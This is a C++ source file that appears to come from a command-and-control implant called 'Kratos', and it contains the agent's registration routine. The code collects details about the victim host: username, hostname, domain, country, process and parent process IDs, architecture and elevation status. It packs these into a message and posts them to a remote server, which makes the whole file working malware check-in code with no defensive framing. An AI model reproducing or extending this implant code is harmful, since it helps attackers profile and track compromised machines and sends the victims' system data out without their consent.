#include "agent/core.h"
#include "packager/packager.h"
#include "utils/utils.h"
#include "net/net.h"


INT32 GenerateAgentID( ) {

	ULONG Seed = kratos->apis.GetTickCount( );
	Seed ^= TO_DWORD( utils::win::GetTeb()->ClientId.UniqueProcess );

	ULONG id = kratos->apis.RtlRandomEx( &Seed );
	DEBUG_LOG("[+] Got Seed");

	return ( INT32 )( id & 0x7FFFFFFF );
}


PWSTR CollectUser( ) {
	DWORD BufSize = 0;

	kratos->apis.GetUserNameW( NULL, &BufSize );
	if ( BufSize == 0 ) { return NULL; }

	PWSTR user = ( PWSTR )kratos->apis.LocalAlloc( ALLOC_ARGS, BufSize * sizeof( WCHAR ) );
	if ( ! user ) { return NULL; }

	if ( ! kratos->apis.GetUserNameW( user, &BufSize ) ) {
		kratos->apis.LocalFree( user );
		return NULL;
	}
	DEBUG_LOG("[+] Got Username");

	return user;
}


PWSTR CollectComputerName( COMPUTER_NAME_FORMAT type ) {
	DWORD size = 0;
	kratos->apis.GetComputerNameExW( type, NULL, &size );
	if ( size == 0 ) { return NULL; }

	PWSTR buf = ( PWSTR )kratos->apis.LocalAlloc( ALLOC_ARGS, size * sizeof( WCHAR ) );
	if ( !buf ) { return NULL; }

	if ( ! kratos->apis.GetComputerNameExW( type, buf, &size ) ) {
		kratos->apis.LocalFree( buf );
		return NULL;
	}
	DEBUG_LOG("[+] Got ComputerName");

	return buf;
}

PWSTR CollectHostName( ) {
	return CollectComputerName( ComputerNameDnsHostname );
}

PWSTR CollectDomainName( ) {
	return CollectComputerName( ComputerNameDnsDomain );
}


BOOL AmIElevated() {
	HANDLE Token = NULL;
	TOKEN_ELEVATION Elev = { 0 };
	DWORD Size = sizeof( TOKEN_ELEVATION );
	BOOL IsElev = FALSE;

	NTSTATUS stat = kratos->apis.NtOpenProcessToken( GetCurrentProcess(), TOKEN_QUERY, &Token );
	if (NTAPI_SUCCESS(stat)) {
		stat = kratos->apis.NtQueryInformationToken( Token, TokenElevation, &Elev, sizeof( Elev ), &Size );
		if (NTAPI_SUCCESS(stat)) {
			IsElev = ( Elev.TokenIsElevated != FALSE );
		}
	}

	if (Token) {
		kratos->apis.CloseHandle( Token );
	}
	DEBUG_LOG("[+] Got IsElev");

	return IsElev;
}


ULONG GetPPID( ) {
	PROCESS_BASIC_INFORMATION pbi = { };
	ULONG retLen = 0;

	NTSTATUS stat = kratos->apis.NtQueryInformationProcess( GetCurrentProcess( ), ProcessBasicInformation, &pbi, sizeof( pbi ), &retLen );
	if (!NTAPI_SUCCESS(stat)) {
		return 0;
	}
	DEBUG_LOG("[+] Got PPID");


	return ( ULONG )( ULONG_PTR )pbi.InheritedFromUniqueProcessId;
}

PWSTR GetCountry( ) {
	PWSTR c = (PWSTR)kratos->apis.LocalAlloc(ALLOC_ARGS, 16 * sizeof(WCHAR));

	if (!c) { return NULL; }

	if (!kratos->apis.GetUserDefaultGeoName(c, 16)) {
		kratos->apis.LocalFree(c);
		return NULL;
	}

	DEBUG_LOG("[+] Got Country");

	return c;
}


BOOL Kratos::Register() {

	if ( ! packager->NewPacker( ) ) { return FALSE; }
	if ( ! packager->PrepareMetaData( 0 ) ) { return FALSE; }

	INT32 AgentID    = GenerateAgentID( );
	INT32 Pid        = TO_DWORD( utils::win::GetTeb( )->ClientId.UniqueProcess );
	DWORD PPId       = GetPPID( );
	DWORD Arch       = ( sizeof ( void*  ) != 4 ) ? 1 : 0;
	PWSTR User       = CollectUser( );
	PWSTR Hostname   = CollectHostName( );
	PWSTR Domain     = CollectDomainName( );
	PWSTR Country    = GetCountry( ); 
	BOOL  IsElevated = AmIElevated( );

	printf("Packager: %0xp\n", packager);

	packager->Pack4( MSG_REGISTER );
	packager->Pack4( AgentID    );
	packager->Pack4( Pid        );
	packager->Pack4( PPId       );
	packager->Pack4( Arch       );
	packager->Pack4( IsElevated );
	DEBUG_LOG("[+] Packed ints");
	packager->PackWideBytes( User     );
	packager->PackWideBytes( Hostname );
	packager->PackWideBytes( Domain   );
	packager->PackWideBytes( Country  );
	DEBUG_LOG("[+] Packed strings");


	net->Post( packager->PackerPointer( ), ( SIZE_T )packager->PackerSize( ) );
	this->AgentID = AgentID;



	if ( User     ) { kratos->apis.LocalFree( User     ); }
	if ( Hostname ) { kratos->apis.LocalFree( Hostname ); }
	if ( Domain   ) { kratos->apis.LocalFree( Domain   ); }
	if ( Country  ) { kratos->apis.LocalFree( Country  ); }
	DEBUG_LOG("[+] Packed Register info!");
	return TRUE;

}